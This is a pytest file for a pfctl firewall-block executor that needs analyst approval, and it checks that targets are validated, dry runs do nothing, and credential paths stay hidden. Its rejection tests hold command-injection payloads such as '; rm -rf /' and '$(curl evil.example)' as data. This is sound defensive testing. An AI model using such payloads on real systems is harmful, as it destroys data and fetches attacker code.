
"""Tests for the OpenBSD pfctl block executor.

These tests are about what the executor refuses to do and about what it never
sends. The target of a firewall block originates in alert data, so the argument
list is treated as an injection boundary: every test that builds a command also
asserts the list contains no shell metacharacters, and no test is allowed to
spawn a process or open an SSH connection.
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any

import pytest

from soc.models import (
    AnalysisSource,
    FalsePositiveLikelihood,
    TriageAction,
    TriageResult,
)
from soc.pfctl_client import (
    PfctlBlockExecutor,
    PfctlConfig,
    PfctlError,
)
from soc.playbooks import Playbook
from soc.response import ResponseActionType, ResponseGate, ResponseStatus

BASE_TIME = datetime(2026, 8, 5, 12, 0, tzinfo=UTC)

IDENTITY_FILE = "/home/soc/.ssh/id_ed25519_soc_response"
"""Stand-in for a credential path that must never be disclosed."""

SHELL_METACHARACTERS = ";|&$`><\n\\!*?(){}[]'\""
"""Characters that must never appear anywhere in a built argument list."""


class RecordingRunner:
    """Fake command runner that records argument lists instead of running them."""

    def __init__(self, *, exit_code: int = 0, stdout: str = "", stderr: str = "") -> None:
        """Initialize the recorder.

        Inputs:
            exit_code: Exit code to report.
            stdout: Standard output to report.
            stderr: Standard error to report.

        Outputs:
            None.
        """

        self.calls: list[list[str]] = []
        self.exit_code = exit_code
        self.stdout = stdout
        self.stderr = stderr

    def __call__(self, argv: list[str]) -> tuple[int, str, str]:
        """Record one invocation and return the configured result.

        Inputs:
            argv: Argument list the executor wants to run.

        Outputs:
            Tuple of exit code, stdout, and stderr.
        """

        self.calls.append(list(argv))
        return self.exit_code, self.stdout, self.stderr


def _config(**overrides: Any) -> PfctlConfig:
    """Build a pfctl config for tests.

    Inputs:
        overrides: Fields to override.

    Outputs:
        PfctlConfig instance.
    """

    values: dict[str, Any] = {
        "host": "pf-firewall.example",
        "user": "soc-response",
        "block_table": "ai_soc_blocklist",
        "ssh_port": 2222,
        "timeout_seconds": 15,
    }
    values.update(overrides)
    return PfctlConfig(**values)


def _triage(score: int = 9, *, source: AnalysisSource = AnalysisSource.LLM) -> TriageResult:
    """Build a triage result eligible for a firewall response.

    Inputs:
        score: Triage score.
        source: Whether the score came from a model.

    Outputs:
        TriageResult instance.
    """

    return TriageResult(
        id="triage-pf-1",
        target_id="CAND-1",
        target_type="incident_candidate",
        score=score,
        fp_likelihood=FalsePositiveLikelihood.LOW,
        classification="likely_true_positive",
        action=TriageAction.PAGE_NOW,
        summary="Confirmed inbound exploitation attempt",
        model="vendor/model-x",
        analysis_source=source,
        prompt_version="triage-v1",
    )


def _playbook() -> Playbook:
    """Build a pf block playbook.

    Inputs:
        None.

    Outputs:
        Playbook instance.
    """

    return Playbook(
        name="block-malicious-ip",
        action=ResponseActionType.PF_BLOCK_IP,
        required_confidence=9,
        description="Add a confirmed malicious address to the pf block table.",
        requires_confirmation=True,
        trigger_actions=(TriageAction.PAGE_NOW,),
    )


def _assert_no_shell_metacharacters(argv: list[str]) -> None:
    """Assert no argument contains a shell metacharacter.

    Inputs:
        argv: Argument list to inspect.

    Outputs:
        None.
    """

    for argument in argv:
        for character in SHELL_METACHARACTERS:
            assert character not in argument, f"{character!r} found in {argument!r}"


def test_config_requires_host_user_and_block_table():
    """The config must refuse to exist without a host, user, and block table."""

    with pytest.raises(PfctlError, match="host"):
        PfctlConfig(host="", user="soc", block_table="t")

    with pytest.raises(PfctlError, match="user"):
        PfctlConfig(host="fw", user="", block_table="t")

    with pytest.raises(PfctlError, match="block table"):
        PfctlConfig(host="fw", user="soc", block_table="")


def test_config_rejects_a_block_table_name_with_shell_metacharacters():
    """A table name is interpolated into a command, so it must be validated too."""

    with pytest.raises(PfctlError, match="block table"):
        PfctlConfig(host="fw", user="soc", block_table="tbl; rm -rf /")


def test_config_rejects_invalid_port_and_timeout():
    """Out-of-range transport settings must be refused at construction time."""

    with pytest.raises(PfctlError, match="port"):
        PfctlConfig(host="fw", user="soc", block_table="t", ssh_port=0)

    with pytest.raises(PfctlError, match="timeout"):
        PfctlConfig(host="fw", user="soc", block_table="t", timeout_seconds=0)


def test_strict_host_key_checking_defaults_to_true():
    """Host key checking must be on unless someone deliberately turns it off."""

    assert _config().strict_host_key_checking is True


def test_disabling_strict_host_key_checking_logs_a_warning(caplog):
    """Turning off host key checking on a firewall path must be recorded."""

    with caplog.at_level("WARNING", logger="soc.pfctl_client"):
        _config(strict_host_key_checking=False)

    warnings = [record for record in caplog.records if record.levelname == "WARNING"]
    assert len(warnings) == 1
    message = warnings[0].getMessage()
    assert "pf-firewall.example" in message
    assert "host key" in message.lower()


def test_describe_returns_the_exact_add_and_delete_commands():
    """describe must state the pfctl command and the command that undoes it."""

    executor = PfctlBlockExecutor(_config(), runner=RecordingRunner())

    command, rollback = executor.describe("8.8.8.8")

    assert command == "pfctl -t ai_soc_blocklist -T add 8.8.8.8"
    assert rollback == "pfctl -t ai_soc_blocklist -T delete 8.8.8.8"


def test_describe_is_pure_and_performs_no_transport_call():
    """describe is called before approval, so it must never touch the transport."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(), runner=runner)

    executor.describe("8.8.8.8")
    executor.describe("8.8.8.8")

    assert runner.calls == []


def test_dry_run_performs_no_transport_call_and_describes_the_action():
    """A dry run must produce a description and zero side effects."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(), runner=runner)

    output = executor.execute("8.8.8.8", dry_run=True)

    assert runner.calls == []
    assert "8.8.8.8" in output
    assert "ai_soc_blocklist" in output
    assert "pf-firewall.example" in output
    assert "dry run" in output.lower()


def test_execute_builds_an_ssh_argument_list_with_no_shell_metacharacters():
    """The block must run over SSH as an argument list, never a shell string."""

    runner = RecordingRunner(stdout="1/1 addresses added.")
    executor = PfctlBlockExecutor(_config(), runner=runner)

    output = executor.execute("8.8.8.8", dry_run=False)

    assert len(runner.calls) == 1
    argv = runner.calls[0]
    assert argv[0] == "ssh"
    assert "-p" in argv
    assert argv[argv.index("-p") + 1] == "2222"
    assert "BatchMode=yes" in argv
    assert "StrictHostKeyChecking=yes" in argv
    assert "soc-response@pf-firewall.example" in argv
    assert argv[-6:] == ["pfctl", "-t", "ai_soc_blocklist", "-T", "add", "8.8.8.8"]
    _assert_no_shell_metacharacters(argv)
    assert "8.8.8.8" in output


def test_execute_includes_the_identity_file_as_a_separate_argument():
    """An identity file must be passed as its own argument, never concatenated."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(identity_file=IDENTITY_FILE), runner=runner)

    executor.execute("8.8.8.8", dry_run=False)

    argv = runner.calls[0]
    assert argv[argv.index("-i") + 1] == IDENTITY_FILE


def test_execute_sends_strict_host_key_checking_no_when_disabled():
    """The built command must reflect the configured host key policy."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(strict_host_key_checking=False), runner=runner)

    executor.execute("8.8.8.8", dry_run=False)

    assert "StrictHostKeyChecking=no" in runner.calls[0]


@pytest.mark.parametrize(
    "target",
    [
        "8.8.8.8; rm -rf /",
        "8.8.8.8 && reboot",
        "$(curl evil.example)",
        "`id`",
        "8.8.8.8\nrm -rf /",
        "-oProxyCommand=curl evil.example",
        "not-an-ip",
        "999.999.999.999",
        "8.8.8.8/24",
        "",
        "   ",
    ],
)
def test_a_malformed_or_malicious_target_is_rejected_before_execution(target):
    """An unvalidated target must never reach the transport."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(), runner=runner)

    with pytest.raises(PfctlError, match="target"):
        executor.execute(target, dry_run=False)

    assert runner.calls == []


@pytest.mark.parametrize("target", ["8.8.8.8; rm -rf /", "not-an-ip"])
def test_describe_also_rejects_a_malicious_target(target):
    """describe builds a command string, so it must validate the target too."""

    executor = PfctlBlockExecutor(_config(), runner=RecordingRunner())

    with pytest.raises(PfctlError, match="target"):
        executor.describe(target)


def test_a_malicious_target_is_rejected_even_in_a_dry_run():
    """Validation must not depend on whether the action would really happen."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(), runner=runner)

    with pytest.raises(PfctlError, match="target"):
        executor.execute("8.8.8.8; rm -rf /", dry_run=True)

    assert runner.calls == []


def test_an_ipv6_target_is_accepted():
    """pf tables hold IPv6 addresses too, so a valid one must be usable."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(), runner=runner)

    command, rollback = executor.describe("2001:4860:4860::8888")
    executor.execute("2001:4860:4860::8888", dry_run=False)

    assert command.endswith("add 2001:4860:4860::8888")
    assert rollback.endswith("delete 2001:4860:4860::8888")
    assert runner.calls[0][-1] == "2001:4860:4860::8888"


def test_a_non_zero_exit_code_raises_with_stderr():
    """A failed pfctl call must raise, carrying the reason, and never fake success."""

    runner = RecordingRunner(exit_code=1, stderr="pfctl: Table does not exist.")
    executor = PfctlBlockExecutor(_config(), runner=runner)

    with pytest.raises(PfctlError) as excinfo:
        executor.execute("8.8.8.8", dry_run=False)

    message = str(excinfo.value)
    assert "Table does not exist" in message
    assert "8.8.8.8" in message
    assert "1" in message


def test_a_failure_message_never_discloses_the_identity_file():
    """Credential paths must not leak into audit records through an error."""

    runner = RecordingRunner(
        exit_code=255,
        stderr=f"Warning: Identity file {IDENTITY_FILE} not accessible.",
    )
    executor = PfctlBlockExecutor(_config(identity_file=IDENTITY_FILE), runner=runner)

    with pytest.raises(PfctlError) as excinfo:
        executor.execute("8.8.8.8", dry_run=False)

    assert IDENTITY_FILE not in str(excinfo.value)


def test_dry_run_output_never_discloses_the_identity_file():
    """The dry-run description is written to the audit trail, so it must be clean."""

    executor = PfctlBlockExecutor(
        _config(identity_file=IDENTITY_FILE),
        runner=RecordingRunner(),
    )

    assert IDENTITY_FILE not in executor.execute("8.8.8.8", dry_run=True)
    assert IDENTITY_FILE not in "".join(executor.describe("8.8.8.8"))


def test_success_output_never_discloses_the_identity_file():
    """Executor output is persisted, so it must not carry credential paths either."""

    runner = RecordingRunner(stdout=f"used identity {IDENTITY_FILE}")
    executor = PfctlBlockExecutor(_config(identity_file=IDENTITY_FILE), runner=runner)

    assert IDENTITY_FILE not in executor.execute("8.8.8.8", dry_run=False)


def test_rollback_removes_the_address_from_the_block_table():
    """A block nobody can undo is not a controlled action."""

    runner = RecordingRunner(stdout="1/1 addresses deleted.")
    executor = PfctlBlockExecutor(_config(), runner=runner)

    output = executor.rollback("8.8.8.8", dry_run=False)

    argv = runner.calls[0]
    assert argv[-6:] == ["pfctl", "-t", "ai_soc_blocklist", "-T", "delete", "8.8.8.8"]
    _assert_no_shell_metacharacters(argv)
    assert "8.8.8.8" in output


def test_rollback_dry_run_performs_no_transport_call():
    """Rolling back must also honour the dry-run contract."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(), runner=runner)

    output = executor.rollback("8.8.8.8", dry_run=True)

    assert runner.calls == []
    assert "delete" in output
    assert "dry run" in output.lower()


def test_rollback_rejects_a_malicious_target():
    """The rollback path is the same injection boundary as the block path."""

    runner = RecordingRunner()
    executor = PfctlBlockExecutor(_config(), runner=runner)

    with pytest.raises(PfctlError, match="target"):
        executor.rollback("8.8.8.8; rm -rf /", dry_run=False)

    assert runner.calls == []


def test_rollback_raises_on_a_non_zero_exit_code():
    """A failed rollback must not report success."""

    runner = RecordingRunner(exit_code=1, stderr="pfctl: no such address")
    executor = PfctlBlockExecutor(_config(), runner=runner)

    with pytest.raises(PfctlError, match="no such address"):
        executor.rollback("8.8.8.8", dry_run=False)


def test_executor_declares_the_pf_block_action():
    """The gate matches executors to proposals by action type."""

    assert PfctlBlockExecutor(_config()).action is ResponseActionType.PF_BLOCK_IP


def test_default_runner_is_not_invoked_without_an_injected_one():
    """Constructing an executor with no runner must not touch subprocess."""

    executor = PfctlBlockExecutor(_config())

    output = executor.execute("8.8.8.8", dry_run=True)

    assert "dry run" in output.lower()


def test_gate_executes_an_approved_proposal_through_the_executor():
    """End to end: the executor must satisfy the ResponseExecutor protocol."""

    runner = RecordingRunner(stdout="1/1 addresses added.")
    executor = PfctlBlockExecutor(_config(), runner=runner)
    gate = ResponseGate(
        [_playbook()],
        capability_enabled=lambda action: action is ResponseActionType.PF_BLOCK_IP,
    )

    proposals = gate.propose(triage=_triage(), target="8.8.8.8")
    approved = gate.approve(proposals[0], analyst="atharv")
    executed = gate.execute(approved, executor=executor, dry_run=False)

    assert executed.status is ResponseStatus.EXECUTED
    assert executed.command == "pfctl -t ai_soc_blocklist -T add 8.8.8.8"
    assert executed.rollback_command == "pfctl -t ai_soc_blocklist -T delete 8.8.8.8"
    assert executed.approved_by == "atharv"
    assert executed.error == ""
    assert len(runner.calls) == 1


def test_gate_records_a_failed_execution_without_faking_success():
    """A raised PfctlError must be recorded as FAILED by the gate."""

    runner = RecordingRunner(exit_code=1, stderr="pfctl: Table does not exist.")
    executor = PfctlBlockExecutor(_config(), runner=runner)
    gate = ResponseGate([_playbook()], capability_enabled=lambda action: True)

    proposals = gate.propose(triage=_triage(), target="8.8.8.8")
    approved = gate.approve(proposals[0], analyst="atharv")
    executed = gate.execute(approved, executor=executor, dry_run=False)

    assert executed.status is ResponseStatus.FAILED
    assert "Table does not exist" in executed.error
